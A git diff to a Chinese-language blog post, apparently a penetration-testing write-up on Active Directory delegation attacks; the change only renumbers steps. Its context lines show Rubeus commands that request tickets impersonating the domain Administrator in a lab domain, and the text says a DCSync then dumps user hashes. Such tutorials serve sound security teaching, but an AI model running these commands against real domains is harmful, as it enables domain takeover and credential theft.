@@ -344,7 +344,7 @@ C:\Users\Marcus\Desktop> Rubeus.exe asktgt /user:PENTEST$ /password:Passw0rd /do
 
 ![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331220856516.png)
 
-（3)然后执行以下命令，使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票证，并将得到的票证传递到内存中，执行结果如下图所示。
+（5）然后执行以下命令，使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票证，并将得到的票证传递到内存中，执行结果如下图所示。
 
 ```console
 C:\Users\Marcus\Desktop> Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC01.pentest.com /dc:DC01.pentest.com /ptt /ticket:<Base64EncodedTicket>
@@ -353,7 +353,7 @@ C:\Users\Marcus\Desktop> Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:
 ![](/assets/posts/2022-03-12-domain-delegation-attack/UQ7epNm1h8nzDVE.png)
 ![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/iMS6EJnGm3HZAew.png)
 
-（4）此时执行 DCSync，可以成功导出域内用户哈希，如下图所示。
+（6）此时执行 DCSync，可以成功导出域内用户哈希，如下图所示。
 
 ![](/assets/posts/2022-03-12-domain-delegation-attack/image-20220331190944631.png)
 ### NTLM Relay + RBCD
